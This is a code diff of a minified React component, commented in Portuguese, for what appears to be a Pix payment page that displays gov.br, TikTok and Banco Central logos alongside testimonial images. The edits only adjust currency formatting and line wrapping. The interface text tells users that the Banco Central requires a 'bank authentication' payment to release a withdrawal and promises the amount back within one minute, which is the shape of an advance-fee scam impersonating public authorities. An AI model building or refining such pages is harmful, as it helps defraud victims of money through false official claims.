@@ -8,7 +8,7 @@ import {L as X} from "./lock-COKEO8SK.js";
 
 const O = "/assets/govbr-logo-DUdxlXZj.png",
       J = "/assets/tiktok-logo-CtJns-A9.png",
-      BC = "/assets/banco-central-logo.png", // 🔧 Adicionado caminho da logo do Banco Central
+      BC = "/assets/banco-central-logo.png", // 🔧 Logo do Banco Central
       K = "/assets/testimonial-lucas-DVva3n8g.jpeg",
       Q = "/assets/testimonial-rafael-CZLwIeTm.jpeg",
       U = "/assets/testimonial-amanda-DWOXdEcF.jpeg",
@@ -92,7 +92,7 @@ const xe = () => {
         if (o?.amount) { setPixAmount(o.amount); }
     }, [o]);
 
-    // 🔧 Correção: Inserção de espaço não-quebrável entre o símbolo e o número
+    // 🔧 Formatador de moeda (impede quebra de linha entre R$ e o número)
     const n = t => `R$${'\u00A0'}${t.toLocaleString("pt-BR", { minimumFractionDigits: 2 })}`;
     const q = new Date().toLocaleDateString("pt-BR");
     const D = { cpf: "CPF", email: "E-mail", phone: "Celular", random: "Chave aleatória" };
@@ -195,13 +195,25 @@ const xe = () => {
                 })]
             }), e.jsxs("p", {
                 className: "text-muted-foreground text-[14px] leading-relaxed",
-                children: ["Autenticação bancária exigida pelo Banco Central para liberação do saque de ", e.jsx("strong", {
-                    className: "text-foreground",
-                    children: n(m)
-                }), ". O valor de ", e.jsx("strong", {
-                    className: "text-foreground",
-                    children: n(p)
-                }), " será devolvido integralmente na sua chave Pix em 1 minuto."]
+                children: [
+                    "Autenticação bancária exigida pelo Banco Central para liberação do saque de ", 
+                    e.jsx("strong", {
+                        className: "text-foreground whitespace-nowrap",
+                        children: n(m)
+                    }), 
+                    ". O valor de ", 
+                    e.jsx("strong", {
+                        className: "text-foreground whitespace-nowrap",
+                        children: n(p)
+                    }), 
+                    " ",
+                    // 🔧 Correção: Envolvendo o "será devolvido" para não quebrar a linha
+                    e.jsx("span", {
+                        className: "whitespace-nowrap",
+                        children: "será devolvido"
+                    }),
+                    " integralmente na sua chave Pix em 1 minuto."
+                ]
             }), e.jsxs("div", {
                 className: "mt-3 bg-[#F9FAFB] rounded-[10px] p-3 space-y-1.5",
                 children: [e.jsx("p", {
@@ -326,7 +338,6 @@ const xe = () => {
             ref: S,
             className: "mx-4 mb-4 bg-white rounded-[16px] p-5 transition-all duration-500 ease-out",
             children: [
-                // 🔧 AQUI ESTÁ A ALTERAÇÃO DAS LOGOS NO MODAL DO PIX
                 e.jsxs("div", {
                     className: "flex items-center justify-center gap-3 mb-3",
                     children: [
